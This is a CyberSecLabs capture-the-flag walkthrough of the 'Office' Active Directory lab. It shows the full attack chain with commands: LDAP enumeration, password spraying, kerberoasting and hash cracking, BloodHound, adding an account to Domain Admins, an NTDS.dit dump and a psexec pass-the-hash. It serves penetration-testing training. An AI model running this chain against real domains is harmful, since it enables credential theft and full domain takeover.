## Cyberseclabs - Office Walkthrough


## Nmap Scan 
As usual, we start off with a nmap scan to discover open ports and its corresponding services runnign on the system.

![73349604a8fada606c18df0f2bb2a237.png](:/1077d4eea06c46fa9137497a699a85f2)

From the nmap scan , we see a bunch of open ports, mainly
- Port 88 : Kerberos
- Ports 135,139,445 : SMB 
- Ports 389,3268 : LDAP
- Port 3389 : RDP
- Port 5985 : Winrm 

Before we continue, we have to edit our **hosts** file and add the  domain name + IP address 

![209685384c341b2a13bcc6db154cf76c.png](:/7e9af7eeebda45f3ae823d8abe3cf6db)

## SMB Enumeration
Let's start off by enumerating SMB, to see if we have anonymous access (a.k.a NULL Session).

![639d87e4e1694f8ae37b4cc25f6ea63f.png](:/6c38a486d1e04b48a2172db9ac54f0eb)
As seen above, no shares were shown/discovered when we login to smb as anonymous 

Since we do not have any credentials or information on SMB, let's turn our attention to LDAP.

## LDAP Enumeration
One great tool to enumerate LDAP that is build into Kali Linux is **ldapsearch**.
![4dd494b148b665de253b7fe1343591e9.png](:/b51447c66b6648e4a138fcc8ab7441c7)
<u>ldapsearch -h 172.31.3.2 -x -s base namingcontexts</u>
By running the above command, we get the base DN so that we can do our ldap query later on.

![dsmith.PNG](:/a1b44b37346f4e0fb3480c0154b0cc11)
![crhodes.PNG](:/9f6e86fdae3f4053b14830addd15e512)
![ssmith.PNG](:/cb9e3b8c42db4f6fb16dff6ea8806503)
<u>ldapsearch -h 172.31.3.2 -x -b "DC=roast,DC=csl"</u>
Looking at the output above , we discovered 3 users and user **dsmith** has its password in his description. (WelcomeToR04st)

We went back to **enumerate smb** with user **dsmith**'s credentials, however, nothing interesting there.

## RPC User Enumeration 
Upon obtaining user **dsmith**'s credentials, I tried to enumerate for more users using rpcclient 
![enumdomusers.PNG](:/b7fe7f7db2734ab18915ed5945a091bb)
From the output, there is an additional non-default user  **roastsvc**.

## Kerbrute PasswordSpray
Since evil-winrm does not return us a shell as user **dsmith**, let's try some password spraying to see if any other users share the same password as **dsmith**
![passwordspraying.PNG](:/5a9bd062dad3454d9295e0eec56e432e)
<u>./kerbrute_linux_amd64 passwordspray -v -d roast.csl --dc 172.31.3.2 users.txt WelcomeToR04st</u>
By password spraying, we discover that user **crhodes** also shares the same password as user **dsmith**. 

## Enumerate users with SPN set
Let's obtain a shell as user **crhodes** using evil-winrm and at the same time, load [PowerView](https://github.com/PowerShellMafia/PowerSploit) powershell script.
![crhodes.PNG](:/2e0db6036f134be99798de82b798da6a)
After obtaining a shell as user **crhodes**, we realised that the access.txt is not in the Desktop directory. It means we have to enumerate more and esclate ourselves to another user. 

From here, we can get more information on all the AD users by running PowerView's command **Get-NetUser -SPN** to list all users with a SPN set. 

![SPN.PNG](:/93faf572df834310b5343b06a599d6b0)
From the output, we discover that user **roastsvc** has a serviceprincipalname(SPN) set. With this information, it tells us that user **roastsvc** is **likely** susceptible to **kerberoasting**.

## Kerberoasting 
Since we know that user **roastsvc** is likely vulnerable to kerberoasting, we can use [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) by impacket to obtain the TGS and take it offline to crack
![TGS.PNG](:/9d2b16f553d84df2951f9689294fdd61)

Once we obtain the TGS, let's crack it with hashcat
![cracked_tgs.PNG](:/ff9b4cc26c334b89bd1f750d5d2912c7)
<u>hashcat -m 13100 -a 0 roastsvc_spn /usr/share/wordlists/rockyou.txt</u>
Credentials -> roastsvc:!!!watermelon245

## Privilege Esclation to SYSTEM
Once we get a shell as user **roastsvc**, we upload and run [BloodHound](https://github.com/BloodHoundAD/BloodHound) against the machine to reveal any misconfigured AD relationships.

First, let's setup a smb-server using impacket then mount the smb share on the target machine, so that we can upload Bloodhound and download the bloodhound output with ease
- 1. Setup impacket's smb-server
	![smbserver.PNG](:/54cf1644a058412d9a55a2b9c1c0aa60)
	Syntax : impacket-smbserver (sharename) (directory) -smb2support -username (your-username) -password (your-password)
- 2. Setup new PSDrive on target machine and mount the share
	![mount.PNG](:/398e5a4e63a144fc958448c879cbced7)
	- $pass = convertto-securestring (your-password) -AsPlainText -Force
	- $cred = New-Object System.Management.Automation.PSCredential('(your-username)', $pass)
	- New-PSDrive -Name (your-username) -PSProvider FileSystem -Credential $cred \\\\(your-ip)\(share-name)
- 3. CD into your share, run bloodhound 
	![sharphound.PNG](:/2f6ae4c9a7374933b2728986f3982fc6)
	- Make sure you upload bloodhound to the directory you created as the share
- 4. Start Bloodhound 
	![bloodhound.PNG](:/a9c5e0824a3a439c81e1b932a7ea1800)
	- neo4j console start
	- bloodhound 

- 5. Upload the bloodhound output to analyze 
	![bloodhound_output.PNG](:/2711aa242a804c03b025b94010c39446)
	- Drag and drop the zip file into the bloodhound console

Once we are done setting up BloodHound, let's start analyzing the output that we have gathered from the target machine.
- 1. Mark user **roastsvc** as **Owned**
	![owned_user.jpg](:/033ae512d51744ef89eb9d29f9d9aca7)
- 2. Use the built-in query 
	![path_to_DA.jpg](:/3af3c76e4f674c14820c983328777f04)
	- "Shortest Path to Domain Admins from Owned Principals"

From here, we found out that user **roastsvc** has **GenericWrite** to group **Domain Admins**.

![generic_write.PNG](:/0fc9fc58b26c431c96e384bff32cfe1c)
- **GenericWrite** : Provides write access to all properties

Since user **roastsvc** has **GenericWrite** permission to the **Domain Admins** group, we can simply just add user **roastsvc** into the **Domain Admins** group.
- 1. List all current members of **Domain Admins** group
	![original_DA_members.PNG](:/51cae26bbcac4ea29e3007122e929219)
	- net group (group-name) /domain
- 2. Add user **roastsvc** into **Domain Admins** group
	![add_to_DA.PNG](:/6845e2604392431186fd5dd30a0a00fb)
	- net group (group-name) (user-to-add) /ADD /DOMAIN 
- 3. Check if user **roastsvc** is added into the group
	![updated_DA_members.PNG](:/6ab0558a3ede405a8debb43f10645a3b)
	- net group (group-name) /domain

Lastly, we can dump the NTDS.dit hash file for the Administrator's hash using [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) by impacket and [PSExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) into the target machine
- 1. Dumping the NTDS.dit hash file 
	![secretsdump.PNG](:/97bc160a3efd40349047ef7a3e553550)
	- python secretsdump.py (domain-name)/(user)@(domain-name) -dc-ip 172.31.3.2
- 2. Get the Administrator's hash
	![admin_hash.PNG](:/259cd6438d5445a4b6007cea42617c99)
- 3. PSExec 
	![psexec.PNG](:/97ad6061099f4f5e9ed1effca035842b)
	- python psexec.py (domain-name)/user@(domain-name) -hashes (admin-hash) -dc-ip 172.31.3.2 




















